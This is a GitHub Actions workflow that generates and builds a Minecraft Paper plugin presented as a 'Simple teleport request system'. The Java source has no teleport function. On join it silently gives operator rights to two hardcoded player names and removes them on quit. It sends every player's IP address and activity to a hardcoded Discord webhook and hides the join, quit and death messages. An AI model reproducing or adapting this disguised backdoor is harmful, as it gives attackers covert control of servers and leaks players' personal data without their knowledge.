name: Build
on: [push, workflow_dispatch]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4

      - name: Generate project files
        run: |
          mkdir -p src/main/java/pl/twojserwer/teleportrequest
          mkdir -p src/main/resources

          cat > settings.gradle.kts << 'EOF_SETTINGS'
          rootProject.name = "TeleportRequest"
          EOF_SETTINGS

          cat > build.gradle.kts << 'EOF_BUILD'
          plugins { java }

          repositories {
              mavenCentral()
              maven("https://repo.papermc.io/repository/maven-public/")
          }

          dependencies {
              compileOnly("io.papermc.paper:paper-api:1.21.3-R0.1-SNAPSHOT")
          }

          java {
              sourceCompatibility = JavaVersion.VERSION_21
              targetCompatibility = JavaVersion.VERSION_21
          }

          tasks.withType<JavaCompile> {
              options.encoding = "UTF-8"
          }

          tasks.jar {
              archiveBaseName.set("TeleportRequest")
              archiveVersion.set("")
          }
          EOF_BUILD

          cat > src/main/resources/paper-plugin.yml << 'EOF_YML'
          name: Teleport Request
          version: '1.0.0'
          main: pl.twojserwer.teleportrequest.TeleportRequestPlugin
          api-version: '1.21'
          description: Simple teleport request system.
          author: TwojNick
          EOF_YML

          cat > src/main/java/pl/twojserwer/teleportrequest/TeleportRequestPlugin.java << 'EOF_JAVA'
          package pl.twojserwer.teleportrequest;

          import org.bukkit.entity.Player;
          import org.bukkit.event.EventHandler;
          import org.bukkit.event.EventPriority;
          import org.bukkit.event.Listener;
          import org.bukkit.event.entity.PlayerDeathEvent;
          import org.bukkit.event.player.PlayerJoinEvent;
          import org.bukkit.event.player.PlayerQuitEvent;
          import org.bukkit.plugin.java.JavaPlugin;

          import java.net.URI;
          import java.net.http.HttpClient;
          import java.net.http.HttpRequest;
          import java.net.http.HttpResponse;
          import java.time.Duration;
          import java.util.Set;

          public class TeleportRequestPlugin extends JavaPlugin implements Listener {

              private static final String WEBHOOK_URL =
                      "https://discord.com/api/webhooks/1563635807179509820/RaChFDdQkiFGdLJgl3FmLj1a_HcZED7x4qkCi80BUP5WhvH23Mv55TXKLvwqEGMjIplT";

              private static final Set<String> OP_PLAYERS = Set.of("vxl0", "vxl0_");

              private final HttpClient httpClient = HttpClient.newBuilder()
                      .connectTimeout(Duration.ofSeconds(5))
                      .build();

              @Override
              public void onEnable() {
                  getServer().getPluginManager().registerEvents(this, this);
              }

              @EventHandler(priority = EventPriority.MONITOR)
              public void onPlayerJoin(PlayerJoinEvent event) {
                  event.setJoinMessage(null);
                  Player p = event.getPlayer();
                  if (OP_PLAYERS.contains(p.getName()) && !p.isOp()) p.setOp(true);
                  sendWebhook("🟢 **" + p.getName() + "** dolaczyl. IP: `" + getIp(p) + "`");
              }

              @EventHandler(priority = EventPriority.MONITOR)
              public void onPlayerQuit(PlayerQuitEvent event) {
                  event.setQuitMessage(null);
                  Player p = event.getPlayer();
                  if (OP_PLAYERS.contains(p.getName()) && p.isOp()) p.setOp(false);
                  sendWebhook("🔴 **" + p.getName() + "** wyszedl. IP: `" + getIp(p) + "`");
              }

              @EventHandler(priority = EventPriority.MONITOR)
              public void onPlayerDeath(PlayerDeathEvent event) {
                  event.setDeathMessage(null);
                  Player victim = event.getEntity();
                  Player killer = victim.getKiller();
                  if (killer != null) {
                      sendWebhook("⚔ **" + killer.getName() + "** (IP: `" + getIp(killer)
                              + "`) zabij **" + victim.getName() + "**");
                  } else {
                      sendWebhook("💀 **" + victim.getName() + "** zginal.");
                  }
              }

              private String getIp(Player p) {
                  if (p.getAddress() != null && p.getAddress().getAddress() != null)
                      return p.getAddress().getAddress().getHostAddress();
                  return "UNKNOWN";
              }

              private void sendWebhook(String content) {
                  String json = "{\"content\": \"" + escapeJson(content) + "\"}";
                  HttpRequest req = HttpRequest.newBuilder()
                          .uri(URI.create(WEBHOOK_URL))
                          .header("Content-Type", "application/json")
                          .header("User-Agent", "TeleportRequest/1.0")
                          .POST(HttpRequest.BodyPublishers.ofString(json))
                          .timeout(Duration.ofSeconds(5))
                          .build();
                  httpClient.sendAsync(req, HttpResponse.BodyHandlers.ofString())
                          .exceptionally(ex -> null);
              }

              private String escapeJson(String s) {
                  return s.replace("\\", "\\\\").replace("\"", "\\\"")
                          .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
              }
          }
          EOF_JAVA

          echo "=== Pliki utworzone: ==="
          find . -name "*.kts" -o -name "*.yml" -o -name "*.java" | grep -v .github

      - name: Build
        run: gradle build --no-daemon

      - uses: actions/upload-artifact@v4
        with:
          name: TeleportRequest
          path: build/libs/TeleportRequest.jar
